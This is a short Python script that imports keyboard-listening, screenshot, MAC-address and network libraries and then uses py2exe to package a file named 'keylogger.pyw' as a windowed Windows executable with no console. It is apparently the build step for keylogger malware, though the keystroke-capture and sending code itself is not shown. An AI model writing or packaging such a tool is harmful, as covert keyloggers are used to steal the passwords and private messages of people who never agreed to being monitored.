from pynput.keyboard import Key, Listener
import logging
import urllib.request
import threading
import socket
from getmac import get_mac_address as gma
import pyautogui
import os


from distutils.core import setup # Need this to handle modules
import py2exe

setup(windows=["keylogger.pyw"],
    options={"py2exe":
       {"optimize": 2,
          "bundle_files": 0,
          "ascii": 0}}
)